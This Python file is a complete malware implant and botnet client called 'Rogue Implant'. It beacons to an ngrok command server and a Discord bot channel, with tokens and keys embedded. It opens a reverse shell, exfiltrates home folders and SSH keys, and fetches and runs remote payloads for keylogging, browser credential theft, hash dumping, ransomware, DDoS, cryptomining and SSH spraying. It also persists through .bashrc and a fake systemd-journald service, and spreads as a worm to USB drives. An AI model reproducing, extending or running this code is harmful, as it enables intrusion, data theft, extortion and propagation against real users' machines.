#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading, sys
from Cryptodome.Cipher import AES
import zipfile, tempfile, shutil, json
import urllib.parse
import ssl
import hashlib

# === Config ===
SECRET_KEY = b'6767BabyROGUE!&%5'
EXFIL_KEY = b'magicRogueSEE!333'
C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

# Implant unique identifier
IMPLANT_ID = f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
IMPLANT_ID_HASH = hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8]

# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/1324352009928376462688/messages?limit=1"
DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE"
BOT_TOKEN = "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"

# SSL context for ngrok
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# === ENHANCED SILENT MODE ===
def should_run_silently():
    """Check if we should run in silent mode - ONLY from persistence"""
    if os.environ.get('ROGUE_LAUNCHED') == '1':
        return True
    try:
        ppid = os.getppid()
        with open(f'/proc/{ppid}/cmdline', 'rb') as f:
            cmdline = f.read().decode('utf-8', errors='ignore').lower()
            if 'bash' in cmdline and ('rc' in cmdline or 'profile' in cmdline):
                return True
    except:
        pass
    return False

def redirect_output_to_log():
    """Redirect all output to log file for silent operation"""
    log_file = os.path.join(HIDDEN_DIR, ".implant.log")
    try:
        log_fd = open(log_file, 'a')
        sys.stdout = log_fd
        sys.stderr = log_fd
        return True
    except Exception as e:
        return False

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def send_https_command(cmd):
    """Send command over HTTPS to C2 - WITH DEBUG OUTPUT"""
    url = f"https://{C2_HOST}/"
    encrypted_cmd = encrypt_response(cmd)
    
    try:
        req = urllib.request.Request(
            url,
            data=encrypted_cmd,
            headers={
                'Content-Type': 'application/octet-stream',
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            },
            method='POST'
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        encrypted_response = response.read()
        decrypted_response = decrypt_command(encrypted_response)
        return decrypted_response
    except Exception as e:
        error_msg = f"[!] Connection failed: {type(e).__name__}"
        if hasattr(e, 'reason'):
            error_msg += f" - {e.reason}"
        print(f"[DEBUG] Connection error: {e}")
        return error_msg

def fetch_payload(name):
    """Fetch payload from C2 server - WITH DEBUG"""
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    
    try:
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            }
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        
        with open(dest, 'wb') as f:
            f.write(response.read())
        
        if name.endswith('.py'):
            os.chmod(dest, 0o755)
        
        print(f"[+] Fetched payload: {name}")
        return dest
        
    except Exception as e:
        print(f"[!] Failed to fetch {name}: {e}")
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        print(f"[+] Running payload: {name}")
        return subprocess.getoutput(f"python3 {path}")
    return f"[!] Payload {name} not found."

def zip_directory(path, zipf=None, base=""):
    if zipf is None:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
        should_close = True
    else:
        should_close = False

    if os.path.isdir(path):
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.join(base, os.path.relpath(full_path, path))
                zipf.write(full_path, arcname)
    elif os.path.isfile(path):
        zipf.write(path, arcname=os.path.join(base, os.path.basename(path)))

    if should_close:
        zipf.close()
        return zip_path

def encrypt_file(path):
    with open(path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(EXFIL_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def exfiltrate_data(path):
    try:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if isinstance(path, list):
                for p in path:
                    zip_directory(p, zipf, base=os.path.basename(p))
            else:
                zip_directory(path, zipf)
        encrypted_blob = encrypt_file(zip_path)
        os.remove(zip_path)

        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, EXFIL_PORT))
        s.sendall(encrypted_blob)
        s.close()
        print(f"[+] Exfiltration successful: {path}")
        return f"[+] Exfiltrated encrypted archive from: {path}"
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
        return f"[!] Exfiltration failed: {e}"

def reverse_shell():
    try:
        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except Exception as e:
        print(f"[!] Reverse shell failed: {e}")

def handle_trigger(cmd):
    if cmd.startswith("trigger_ddos"):
        fetch_payload("ddos.py")
        path = os.path.join(HIDDEN_DIR, "ddos.py")
        args = " ".join(cmd.split()[1:])
        if os.path.exists(path):
            print(f"[+] Starting DDoS attack with args: {args}")
            return subprocess.getoutput(f"python3 {path} {args}")
        return "[!] ddos.py not found after download"

    elif cmd == "trigger_mine":
        fetch_payload("mine.py")
        print("[+] Starting crypto miner")
        return run_payload("mine.py")

    elif cmd == "trigger_stopmine":
        print("[+] Stopping crypto miner")
        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")

    elif cmd.startswith("trigger_exfil"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_exfil <path>"
        path = parts[1]
        print(f"[+] Starting exfiltration of: {path}")
        return exfiltrate_data(path)

    elif cmd == "trigger_dumpcreds":
        targets = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/.ssh"),
        ]
        existing_targets = [t for t in targets if os.path.exists(t)]
        if existing_targets:
            print(f"[+] Dumping credentials from {len(existing_targets)} locations")
            return exfiltrate_data(existing_targets)
        return "[!] No target directories found"

    elif cmd == "trigger_stealthinject":
        path = os.path.join(HIDDEN_DIR, "polyloader.py")
        if not os.path.exists(path):
            fetch_payload("polyloader.py")
        if os.path.exists(path):
            print("[+] Executing polyloader.py")
            return subprocess.getoutput(f"python3 {path}")
        return "[!] polyloader.py not found"

    # === NEW TRIGGERS FOR ENHANCED PAYLOAD SUITE ===
    
    elif cmd == "trigger_sysrecon":
        """Execute system reconnaissance"""
        fetch_payload("sysrecon.py")
        print("[+] Starting system reconnaissance")
        return run_payload("sysrecon.py")

    elif cmd == "trigger_linpeas":
        """Execute Linux privilege escalation check"""
        fetch_payload("linpeas_light.py")
        print("[+] Starting LinPEAS privilege escalation check")
        return run_payload("linpeas_light.py")

    elif cmd == "trigger_hashdump":
        """Dump password hashes"""
        fetch_payload("hashdump.py")
        print("[+] Starting password hash extraction")
        return run_payload("hashdump.py")

    elif cmd == "trigger_browsersteal":
        """Steal browser credentials and data"""
        fetch_payload("browserstealer.py")
        print("[+] Starting browser data extraction")
        return run_payload("browserstealer.py")

    elif cmd.startswith("trigger_keylogger"):
        """Start/stop keystroke logging"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping keylogger")
            return subprocess.getoutput("pgrep -f keylogger.py && pkill -f keylogger.py || echo '[-] No keylogger running.'")
        else:
            fetch_payload("keylogger.py")
            print("[+] Starting keystroke logger")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("keylogger.py")).start()
            return "[*] Keylogger started in background"

    elif cmd.startswith("trigger_screenshot"):
        """Take screenshots"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping screenshot capture")
            return subprocess.getoutput("pgrep -f screenshot.py && pkill -f screenshot.py || echo '[-] No screenshot capture running.'")
        else:
            fetch_payload("screenshot.py")
            print("[+] Starting screenshot capture")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("screenshot.py")).start()
            return "[*] Screenshot capture started in background"

    elif cmd.startswith("trigger_logclean"):
        """Clean system logs"""
        parts = cmd.split()
        if len(parts) > 1:
            fetch_payload("logcleaner.py")
            if parts[1] == "all":
                print("[+] Cleaning all logs")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} --all")
            else:
                print(f"[+] Cleaning logs: {parts[1]}")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} {parts[1]}")
        else:
            fetch_payload("logcleaner.py")
            print("[+] Cleaning implant logs")
            return run_payload("logcleaner.py")

    elif cmd.startswith("trigger_sshspray"):
        """SSH credential spraying attack"""
        fetch_payload("sshspray.py")
        parts = cmd.split()
        if len(parts) > 1:
            # Parse arguments: trigger_sshspray <target> <userlist> <passlist>
            if len(parts) >= 4:
                target = parts[1]
                userlist = parts[2]
                passlist = parts[3]
                print(f"[+] Starting SSH spray attack on {target}")
                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'sshspray.py')} {target} {userlist} {passlist}")
            else:
                return "[!] Usage: trigger_sshspray <target> <userlist> <passlist>"
        else:
            print("[+] Starting SSH spray with default settings")
            return run_payload("sshspray.py")

    elif cmd.startswith("trigger_dnstunnel"):
        """DNS tunneling C2 channel"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping DNS tunnel")
            return subprocess.getoutput("pgrep -f dnstunnel.py && pkill -f dnstunnel.py || echo '[-] No DNS tunnel running.'")
        else:
            fetch_payload("dnstunnel.py")
            print("[+] Starting DNS tunneling")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("dnstunnel.py")).start()
            return "[*] DNS tunnel started in background"

    elif cmd == "trigger_autodeploy":
        """Auto-deploy to network"""
        fetch_payload("autodeploy.py")
        print("[+] Starting auto-deployment to network")
        # Start in background thread as it will take time
        threading.Thread(target=lambda: run_payload("autodeploy.py")).start()
        return "[*] Auto-deployment started in background"

    elif cmd == "trigger_network_scan":
        """Network scanning and host discovery"""
        fetch_payload("network_scanner.py")
        print("[+] Starting network scan")
        return run_payload("network_scanner.py")

    elif cmd == "trigger_persistence_setup":
        """Set up additional persistence mechanisms"""
        fetch_payload("persistence.py")
        print("[+] Setting up additional persistence")
        return run_payload("persistence.py")

    elif cmd == "trigger_defense_evasion":
        """Execute defense evasion techniques"""
        fetch_payload("defense_evasion.py")
        print("[+] Starting defense evasion")
        return run_payload("defense_evasion.py")

    elif cmd == "trigger_lateral_move":
        """Attempt lateral movement"""
        fetch_payload("lateral_movement.py")
        print("[+] Attempting lateral movement")
        return run_payload("lateral_movement.py")

    elif cmd == "trigger_forensics_check":
        """Check for forensic artifacts"""
        fetch_payload("forensics_check.py")
        print("[+] Checking for forensic artifacts")
        return run_payload("forensics_check.py")
    
    # === ADVANCED PAYLOADS - NEW ADDITIONS ===
    
    elif cmd == "trigger_procinject":
        """Process injection for stealth execution"""
        fetch_payload("process_inject.py")
        print("[+] Starting process injection module")
        return run_payload("process_inject.py")
    
    elif cmd == "trigger_filehide":
        """Advanced file hiding techniques"""
        fetch_payload("advanced_filehider.py")
        print("[+] Starting advanced file hiding")
        return run_payload("advanced_filehider.py")
    
    elif cmd == "trigger_cronpersist":
        """Advanced cron persistence methods"""
        fetch_payload("advanced_cron_persistence.py")
        print("[+] Setting up advanced cron persistence")
        return run_payload("advanced_cron_persistence.py")
    
    elif cmd == "trigger_compclean":
        """Competitor/malware cleaner"""
        fetch_payload("competitor_cleaner.py")
        print("[+] Starting competitor cleanup")
        return run_payload("competitor_cleaner.py")
    
    # === FILE ENCRYPTION PAYLOAD ===
    
    elif cmd.startswith("trigger_fileransom"):
        """File encryption/decryption ransomware"""
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_fileransom <encrypt/decrypt> <path> [password] OR trigger_fileransom encrypt system_<mode> [password]"
        
        action = parts[1]
        fetch_payload("fileransom.py")
        
        # Build command for the payload
        payload_path = os.path.join(HIDDEN_DIR, "fileransom.py")
        
        if action == "encrypt":
            if len(parts) >= 3:
                target = parts[2]
                
                # Check for system-wide modes
                if target.startswith("system_"):
                    # System-wide encryption
                    mode = target
                    cmd_args = f"encrypt --mode {mode}"
                elif target == "all":
                    # Encrypt all user files
                    cmd_args = f"encrypt all"
                else:
                    # Normal path encryption
                    cmd_args = f"encrypt \"{target}\""
            else:
                cmd_args = "encrypt"
            
            # Optional custom password
            if len(parts) >= 4:
                password = parts[3]
                cmd_args += f" --custom-password \"{password}\""
            
            print(f"[+] Starting file encryption")
            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
        
        elif action == "decrypt":
            if len(parts) < 3:
                return "[!] Usage: trigger_fileransom decrypt <path/system_wide> <password>"
            
            target = parts[2]
            
            if target == "system_wide":
                # System-wide decryption
                if len(parts) < 4:
                    return "[!] Usage: trigger_fileransom decrypt system_wide <password>"
                
                password = parts[3]
                cmd_args = f"decrypt system_wide --password \"{password}\""
            else:
                # Normal decryption
                if len(parts) < 4:
                    return "[!] Usage: trigger_fileransom decrypt <path> <password>"
                
                password = parts[3]
                cmd_args = f"decrypt \"{target}\" --password \"{password}\""
            
            print(f"[+] Starting file decryption")
            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
        
        else:
            return "[!] Unknown action. Use 'encrypt' or 'decrypt'"
    
    # === COMPOUND TRIGGERS ===
    
    elif cmd == "trigger_full_recon":
        """Execute full reconnaissance suite"""
        print("[+] Starting full reconnaissance suite")
        results = []
        results.append("=== FULL RECONNAISSANCE SUITE ===")
        
        # System reconnaissance
        fetch_payload("sysrecon.py")
        results.append("\n[1] System Reconnaissance:")
        results.append(run_payload("sysrecon.py"))
        
        # Privilege escalation check
        fetch_payload("linpeas_light.py")
        results.append("\n[2] Privilege Escalation Check:")
        results.append(run_payload("linpeas_light.py"))
        
        # Hash dump
        fetch_payload("hashdump.py")
        results.append("\n[3] Password Hash Extraction:")
        results.append(run_payload("hashdump.py"))
        
        # Network scan
        fetch_payload("network_scanner.py")
        results.append("\n[4] Network Scan:")
        results.append(run_payload("network_scanner.py"))
        
        return "\n".join(results)

    elif cmd == "trigger_clean_sweep":
        """Clean all forensic traces and restart stealthily"""
        print("[+] Starting clean sweep operation")
        results = []
        
        # Clean logs first
        fetch_payload("logcleaner.py")
        results.append("[1] Cleaning logs:")
        results.append(run_payload("logcleaner.py"))
        
        # Defense evasion
        fetch_payload("defense_evasion.py")
        results.append("\n[2] Defense evasion:")
        results.append(run_payload("defense_evasion.py"))
        
        # Kill and restart implant
        results.append("\n[3] Restarting implant in stealth mode...")
        # This would restart the implant - implementation depends on your restart mechanism
        results.append("[+] Implant will restart after cleanup")
        
        return "\n".join(results)

    elif cmd == "trigger_harvest_all":
        """Harvest all possible data"""
        print("[+] Starting complete data harvesting")
        results = []
        results.append("=== COMPLETE DATA HARVEST ===")
        
        # Browser data
        fetch_payload("browserstealer.py")
        results.append("\n[1] Browser Data:")
        results.append(run_payload("browserstealer.py"))
        
        # Password hashes
        fetch_payload("hashdump.py")
        results.append("\n[2] Password Hashes:")
        results.append(run_payload("hashdump.py"))
        
        # SSH keys
        results.append("\n[3] SSH Keys:")
        ssh_keys = subprocess.getoutput("find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null")
        results.append(ssh_keys[:2000])  # Limit output
        
        # Configuration files
        results.append("\n[4] Configuration Files:")
        config_files = subprocess.getoutput("find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' 2>/dev/null | head -20")
        results.append(config_files)
        
        return "\n".join(results)

    # === UTILITY TRIGGERS ===
    
    elif cmd == "trigger_status":
        """Check implant status"""
        print("[+] Checking implant status")
        status = []
        status.append(f"Implant ID: {IMPLANT_ID_HASH}")
        status.append(f"C2 Server: {C2_HOST}")
        status.append(f"Hidden Directory: {HIDDEN_DIR}")
        status.append(f"Process Name: {subprocess.getoutput('ps -p $$ -o comm=')}")
        status.append(f"Uptime: {subprocess.getoutput('uptime')}")
        status.append(f"Memory Usage: {subprocess.getoutput('free -h | head -2')}")
        status.append(f"Network Connections: {len(subprocess.getoutput('netstat -tunap 2>/dev/null | grep ESTABLISHED').splitlines())} established")
        
        # Check payloads
        payloads = os.listdir(HIDDEN_DIR) if os.path.exists(HIDDEN_DIR) else []
        python_payloads = [p for p in payloads if p.endswith('.py')]
        status.append(f"Available Payloads: {len(python_payloads)}")
        
        return "\n".join(status)

    elif cmd == "trigger_self_update":
        """Update the implant from C2"""
        print("[+] Starting self-update")
        try:
            # Download latest implant
            url = f"{PAYLOAD_REPO}rogue_implant.py"
            req = urllib.request.Request(
                url,
                headers={
                    'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                    'X-Implant-ID': IMPLANT_ID_HASH
                }
            )
            response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
            new_implant = response.read()
            
            # Save to temporary location
            temp_file = os.path.join(HIDDEN_DIR, "rogue_implant_new.py")
            with open(temp_file, 'wb') as f:
                f.write(new_implant)
            
            # Replace current implant
            current_file = __file__
            shutil.copy(temp_file, current_file)
            os.chmod(current_file, 0o755)
            os.remove(temp_file)
            
            return "[+] Implant updated successfully. Restart to apply changes."
        except Exception as e:
            return f"[!] Update failed: {e}"

    elif cmd == "trigger_help":
        """Show available triggers"""
        help_text = """
=== ROGUE IMPLANT TRIGGER COMMANDS ===

BASIC OPERATIONS:
  trigger_status           - Check implant status
  trigger_self_update      - Update implant from C2
  trigger_dumpcreds        - Dump credentials from common locations
  trigger_exfil <path>     - Exfiltrate data from specified path
  reverse_shell           - Start reverse shell to C2

RECONNAISSANCE & INTELLIGENCE:
  trigger_sysrecon        - System reconnaissance
  trigger_linpeas         - Linux privilege escalation check
  trigger_hashdump        - Password hash extraction
  trigger_browsersteal    - Browser data theft
  trigger_network_scan    - Network host discovery

ADVANCED PAYLOADS:
  trigger_procinject      - Process injection for stealth execution
  trigger_filehide        - Advanced file hiding techniques
  trigger_cronpersist     - Advanced cron persistence methods
  trigger_compclean       - Clean competitor malware/botnets
  trigger_fileransom encrypt <path> [password] - Encrypt files
  trigger_fileransom encrypt system_<mode> [password] - System-wide encryption
  trigger_fileransom encrypt all [password] - Encrypt all user files
  trigger_fileransom decrypt <path> <password> - Decrypt files
  trigger_fileransom decrypt system_wide <password> - System-wide decryption

MONITORING & COLLECTION:
  trigger_keylogger       - Start keystroke logging
  trigger_keylogger stop  - Stop keylogger
  trigger_screenshot      - Start screen capture
  trigger_screenshot stop - Stop screenshot capture

PERSISTENCE & STEALTH:
  trigger_stealthinject   - Execute polyroot persistence
  trigger_persistence_setup - Set up additional persistence
  trigger_defense_evasion - Execute defense evasion techniques
  trigger_logclean        - Clean system logs
  trigger_logclean all    - Clean all logs aggressively

LATERAL MOVEMENT:
  trigger_sshspray        - SSH credential spraying
  trigger_dnstunnel       - DNS tunneling C2
  trigger_autodeploy      - Auto-deploy to network
  trigger_lateral_move    - Attempt lateral movement

DDoS & CRYPTOMINING:
  trigger_ddos <target> <port> <duration> - DDoS attack
  trigger_mine            - Start cryptominer
  trigger_stopmine        - Stop cryptominer

COMPOUND OPERATIONS:
  trigger_full_recon      - Execute full reconnaissance suite
  trigger_clean_sweep     - Clean forensic traces and restart
  trigger_harvest_all     - Harvest all possible data

UTILITIES:
  trigger_forensics_check - Check for forensic artifacts
  trigger_help           - Show this help message

Use: load_payload <name.py> to download or run_payload <name.py> to execute
        """
        return help_text

    return None

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: load_payload <filename>"
        payload_name = parts[1]
        result = fetch_payload(payload_name)
        return f"[+] Fetched {payload_name}" if result else f"[!] Failed to fetch {payload_name}"
    
    elif cmd.startswith("run_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: run_payload <filename>"
        return run_payload(parts[1])
    
    elif cmd.startswith("trigger_"):
        result = handle_trigger(cmd)
        return result if result else "[!] Trigger failed"
    
    elif cmd == "reverse_shell":
        print("[+] Starting reverse shell thread")
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"
    
    else:
        print(f"[+] Executing command: {cmd}")
        return subprocess.getoutput(cmd)

def beacon():
    """Main beacon loop using HTTPS - WITH VISIBLE OUTPUT WHEN MANUAL"""
    silent_mode = should_run_silently()
    
    if not silent_mode:
        print(f"[+] Starting HTTPS beacon to {C2_HOST}")
        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    beacon_count = 0
    identified = False
    bot_id = None
    
    while True:
        try:
            beacon_count += 1
            
            if not silent_mode:
                print(f"[BEACON #{beacon_count}] Checking in...")
            
            response = send_https_command("beacon")
            
            if not silent_mode:
                print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
            
            if response and response != "pong":
                if response.startswith("identified:"):
                    bot_id = response.replace("identified:", "", 1)
                    identified = True
                    if not silent_mode:
                        print(f"[+] C2 identified us as: {bot_id}")
                else:
                    if not silent_mode:
                        print(f"[+] Received command: {response}")
                    result = handle_command(response)
                    if not silent_mode:
                        result_preview = result[:100] + "..." if len(result) > 100 else result
                        print(f"[+] Command result: {result_preview}")
                    
                    if result:
                        send_https_command(f"result:{result}")
            
            if not identified and beacon_count == 1:
                if not silent_mode:
                    print(f"[+] Sending identification to C2...")
                send_https_command(f"identify:{IMPLANT_ID_HASH}")
            
            if not silent_mode:
                print(f"[.] Next beacon in 30 seconds...")
            time.sleep(30)
            
        except Exception as e:
            if not silent_mode:
                print(f"[!] Beacon error: {e}")
                print(f"[!] Retrying in 60 seconds...")
            time.sleep(60)

def check_discord_command():
    """Check Discord for commands"""
    try:
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
        response = urllib.request.urlopen(req).read().decode()
        latest = json.loads(response)[0]["content"]
        return latest
    except Exception as e:
        print(f"[!] Discord command check failed: {e}")
        return None

def send_to_webhook(content):
    """Send result to Discord webhook"""
    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps({"content": content}).encode(),
            headers={"Content-Type": "application/json"},
            method='POST'
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"[!] Discord webhook send failed: {e}")

def discord_loop():
    """Discord fallback command loop"""
    silent_mode = should_run_silently()
    
    if not silent_mode:
        print("[+] Discord beacon active")
    
    last_cmd = ""
    
    while True:
        try:
            cmd = check_discord_command()
            if cmd and cmd != last_cmd:
                if not silent_mode:
                    print(f"[Discord] Received command: {cmd}")
                result = handle_command(cmd)
                encrypted_result = encrypt_response(result).decode()
                send_to_webhook(encrypted_result)
                last_cmd = cmd
        except Exception as e:
            if not silent_mode:
                print(f"[!] Discord loop error: {e}")
        
        time.sleep(30)

def fake_name():
    """Change process name for stealth"""
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
        print("[+] Process name changed to systemd-journald")
    except:
        pass

def setup_persistence():
    """Set up stealthy persistence"""
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    
    if not os.path.exists(target):
        shutil.copy(__file__, target)
        
        persistence_script = f'''if [ -z "${{ROGUE_LAUNCHED+x}}" ]; then
    export ROGUE_LAUNCHED=1
    (cd {HIDDEN_DIR} && nohup python3 {target} >/dev/null 2>&1 &)
fi'''
        
        bashrc_path = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc_path):
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System journal service\n{persistence_script}\n")
            print(f"[+] Persistence installed to .bashrc")
        
        return True
    return False

def create_systemd_service(target_path):
    """Create a systemd service file for more robust persistence"""
    service_content = f"""[Unit]
Description=System Journal Service
After=network.target

[Service]
Type=simple
User={os.getlogin()}
WorkingDirectory={HIDDEN_DIR}
ExecStart=/usr/bin/python3 {target_path}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
    
    service_file = os.path.join(HIDDEN_DIR, "systemd-journald.service")
    with open(service_file, 'w') as f:
        f.write(service_content)
    
    install_script = os.path.join(HIDDEN_DIR, "install_service.sh")
    with open(install_script, 'w') as f:
        f.write(f"""#!/bin/bash
sudo cp {service_file} /etc/systemd/system/systemd-journald.service
sudo systemctl daemon-reload
sudo systemctl enable --now systemd-journald
""")
    os.chmod(install_script, 0o755)
    print(f"[+] Systemd service created: {service_file}")

def worm_propagate():
    """Worm propagation to removable drives"""
    try:
        drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
        for mount in drives:
            if "/media" in mount or "/run/media" in mount:
                try:
                    worm_dir = os.path.join(mount.strip(), ".rogue_worm")
                    os.makedirs(worm_dir, exist_ok=True)
                    shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                        f.write(f"if [ -z \"${{ROGUE_WORM_LAUNCHED+x}}\" ]; then export ROGUE_WORM_LAUNCHED=1; (cd {worm_dir} && nohup python3 rogue_implant.py >/dev/null 2>&1 &); fi\n")
                    print(f"[+] Worm propagated to: {worm_dir}")
                except Exception as e:
                    print(f"[!] Worm propagation failed for {mount}: {e}")
    except Exception as e:
        print(f"[!] Worm propagation failed: {e}")

def p2p_listener():
    """P2P listener for bot communication"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    backup_ports = [7008, 7009, 7010, 7011]
    bound = False

    for port in backup_ports:
        try:
            sock.bind(('0.0.0.0', port))
            bound = True
            print(f"[+] P2P listener bound to port {port}")
            break
        except OSError:
            continue

    if not bound:
        print("[!] P2P listener failed to bind")
        return

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if data.decode() == "Rogue?":
                sock.sendto(b"I'm Rogue", addr)
                print(f"[P2P] Responded to query from {addr}")
        except:
            break

def p2p_broadcast():
    """P2P broadcast to find other bots"""
    ports = [7008, 7009, 7010, 7011]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    while True:
        for port in ports:
            try:
                sock.sendto(b"Rogue?", ('<broadcast>', port))
            except:
                continue
        time.sleep(60)

def cleanup_old_persistence():
    """Remove old aggressive persistence from .bashrc"""
    rc_files = ['.bashrc', '.profile', '.bash_profile']
    for rc_file in rc_files:
        rc_path = os.path.expanduser(f"~/{rc_file}")
        if os.path.exists(rc_path):
            with open(rc_path, 'r') as f:
                lines = f.readlines()
            
            new_lines = [line for line in lines if 'rogue_agent.py' not in line and 'System maintenance' not in line]
            
            if len(new_lines) != len(lines):
                with open(rc_path, 'w') as f:
                    f.writelines(new_lines)
                print(f"[+] Cleaned old persistence from {rc_file}")

# === Main Function ===
def main():
    """Main entry point with smart silent mode"""
    silent_mode = should_run_silently()
    
    cleanup_old_persistence()
    
    if silent_mode:
        print(f"[+] Rogue Implant starting in silent mode...")
        redirect_output_to_log()
    else:
        print("[+] Rogue Implant starting...")
        print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
        print(f"[+] Payload Repo: {PAYLOAD_REPO}")
        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    if silent_mode and os.isatty(0):
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    
    fake_name()
    setup_persistence()
    worm_propagate()
    
    threading.Thread(target=p2p_listener, daemon=True).start()
    threading.Thread(target=p2p_broadcast, daemon=True).start()
    threading.Thread(target=discord_loop, daemon=True).start()
    
    if not silent_mode:
        print("[+] All systems operational. Starting beacon...")
    
    beacon()

# === Launch ===
if __name__ == "__main__":
    main()
